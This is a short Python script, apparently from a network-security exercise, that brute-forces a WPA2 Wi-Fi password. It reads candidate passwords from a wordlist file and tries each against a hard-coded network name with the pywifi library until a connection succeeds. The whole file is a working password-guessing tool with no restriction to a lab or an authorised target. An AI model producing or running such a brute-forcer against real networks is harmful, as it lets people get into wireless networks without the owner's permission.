#import lib
import time, pywifi
from pywifi import PyWiFi, const

def connect_to_wifi(ssid, password):
    #disconnect wifi
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)

    #prepare to connect to wifi
    profile = pywifi.Profile() #creates profile wifi
    profile.ssid = ssid #sets the SSID (name)
    profile.auth = const.AUTH_ALG_OPEN #sets the authentication algorithm
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #adds a key management type to the profile
    profile.cipher = const.CIPHER_TYPE_CCMP  #sets the cipher type
    profile.key = password #sets the password 

    #created to the Wi-Fi interface
    tmp_profile = iface.add_network_profile(profile) 

    #connecting
    iface.connect(tmp_profile)
    time.sleep(5)

    #check
    if iface.status() == const.IFACE_CONNECTED:
        print("successfully")
        return True
    else:
        print("Error")
        return False

#check each passwords for file input
def try_passwords_from_file(ssid, filename):
    with open(filename, 'r') as file:
        for line in file:
            password = line.strip()  
            print(f"check: {password}")
            if connect_to_wifi(ssid, password):
                print(f"Successfully connected to WiFi network: {password}")
                break  

if __name__ == "__main__":
    #Name wifi
    ssid = "SIUUU"
    #file path
    password_file = "D:/ThachThucNhaMang/list.txt"
    #enforcement
    try_passwords_from_file(ssid, password_file)
